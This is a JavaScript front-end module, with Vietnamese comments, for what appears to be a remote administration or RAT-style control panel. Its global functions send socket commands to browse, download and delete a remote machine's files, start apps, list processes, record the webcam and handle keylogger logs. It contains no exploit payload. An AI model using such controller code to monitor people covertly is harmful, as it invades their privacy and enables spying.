/**
 * GLOBAL BRIDGE
 * Export các function ra global scope để HTML onclick có thể gọi được
 */

import { SocketService } from '../services/socket.js';
import { UIManager } from './ui.js';

// --- COMMAND SENDER ---
window.sendCommand = function(command, param = "") {
    SocketService.send(command, param);
};

// Alias
window.sendCmd = window.sendCommand;

// --- DASHBOARD FEATURES ---
window.startApp = function() {
    const input = document.getElementById("quickAppInput");
    const appName = input?.value.trim();
    if (appName) {
        SocketService.send("START_APP", appName);
        input.value = "";
        UIManager.showToast(`Starting ${appName}...`, "info");
    } else {
        UIManager.showToast("Please enter app name!", "error");
    }
};

window.openWeb = function(url) {
    SocketService.send("START_APP", url);
    UIManager.showToast(`Opening ${url}...`, "info");
};

window.browseApps = function() {
    document.getElementById("app-library-modal")?.classList.remove("hidden");
    SocketService.send("GET_INSTALLED");
};

window.closeAppLibrary = function() {
    document.getElementById("app-library-modal")?.classList.add("hidden");
};

window.filterApps = function() {
    const keyword = document.getElementById("appSearch")?.value.toLowerCase() || "";
    // Trigger event để các module xử lý
    window.dispatchEvent(new CustomEvent('filterApps', { detail: { keyword } }));
};

// --- FILE MANAGER ---
window.getDrives = function() {
    document.getElementById("current-path").textContent = "My Computer";
    SocketService.send("GET_DRIVES");
};

window.openFolder = function(path) {
    document.getElementById("current-path").textContent = path;
    SocketService.send("GET_DIR", path);
};

window.reqDownloadFile = function(path) {
    if(confirm("Download this file?")) {
        SocketService.send("DOWNLOAD_FILE", path);
    }
};

window.reqDeleteFile = function(path) {
    if(confirm("PERMANENTLY DELETE this file?")) {
        SocketService.send("DELETE_FILE", path);
        setTimeout(() => {
            const currentPath = document.getElementById("current-path")?.textContent;
            if(currentPath && currentPath !== "My Computer") {
                window.openFolder(currentPath);
            }
        }, 1000);
    }
};

// --- TASK MANAGER ---
window.getApps = function() {
    SocketService.send("GET_APPS");
};

window.getProcesses = function() {
    SocketService.send("GET_PROCESS");
};

// --- WEBCAM ---
window.startRecordWebcam = function() {
    const duration = document.getElementById("record-duration")?.value || 10;
    SocketService.send("RECORD_WEBCAM", duration);
    UIManager.showToast(`Recording for ${duration}s...`, "info");
};

// --- KEYLOGGER ---
window.clearAllKeylogs = function() {
    document.getElementById("raw-key-output").innerHTML = "";
    document.getElementById("keylogger-editor").value = "";
    UIManager.showToast("Keylogs cleared", "success");
};

window.downloadLog = function() {
    const content = document.getElementById("keylogger-editor")?.value;
    if (!content) return UIManager.showToast("Log is empty!", "error");
    
    const blob = new Blob([content], { type: "text/plain;charset=utf-8" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `Keylog_${Date.now()}.txt`;
    a.click();
    setTimeout(() => URL.revokeObjectURL(url), 100);
    UIManager.showToast("Downloaded!", "success");
};

// --- MONITOR ---
window.viewFullImage = function(imgElement) {
    const w = window.open("");
    w.document.write(`<img src="${imgElement.src}" style="width:100%">`);
};

console.log("✅ Global Bridge Loaded - All onclick functions available");
